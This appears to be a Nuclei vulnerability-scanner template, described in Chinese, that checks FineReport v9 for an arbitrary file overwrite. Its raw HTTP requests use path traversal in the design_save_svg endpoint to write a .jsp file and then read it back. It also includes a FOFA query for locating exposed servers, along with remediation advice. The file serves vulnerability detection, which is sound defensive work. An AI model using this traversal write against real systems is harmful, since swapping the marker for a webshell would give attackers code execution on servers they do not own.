id: fine-report-v9-file-upload

info:
  name: FineReport v9 Arbitrary File Overwrite
  author: SleepingBag945
  severity: critical
  description: |
    该模板用于检测 FineReport v9 Arbitrary File Overwrite。该类漏洞通常源于上传接口缺少文件类型、路径或执行权限控制，导致恶意文件可被写入服务器。模板主要向 `/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport...`、`/WebReport/{变量}.jsp` 等路径发送探测请求，并根据状态码、响应头、页面关键字或时间差等证据确认漏洞是否存在。
  impact: |
    - 攻击者可上传恶意脚本、WebShell 或伪装文件，进而执行代码或长期控制站点。
    - 若上传目录可被 Web 服务器解析，漏洞可能直接导致服务器失陷和业务数据泄露。
  remediation: |
    - 对上传文件执行扩展名、MIME、魔数和内容校验，并使用随机文件名保存到不可执行目录。
    - 禁止上传目录执行脚本，分离静态文件域名和应用执行环境。
    - 清理历史上传文件，排查 WebShell、异常访问日志和新增系统账号。
  reference:
    - https://github.com/NHPT/WebReportV9Exp/blob/main/WebReport_Exp.
  metadata:
    max-request: 2
    fofa-query: app="帆软-FineReport"
  tags: finereport,fileupload,intrusive,vuln
variables:
  string: '{{rand_base(8, "abc")}}'
  filename: '{{rand_base(8)}}'

http:
  - raw:
      - |
        POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/{{filename}}.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml;charset=UTF-8

        {"__CONTENT__":"{{string}}","__CHARSET__":"UTF-8"}
      - |
        GET /WebReport/{{filename}}.jsp HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body_2
        words:
          - "{{string}}"
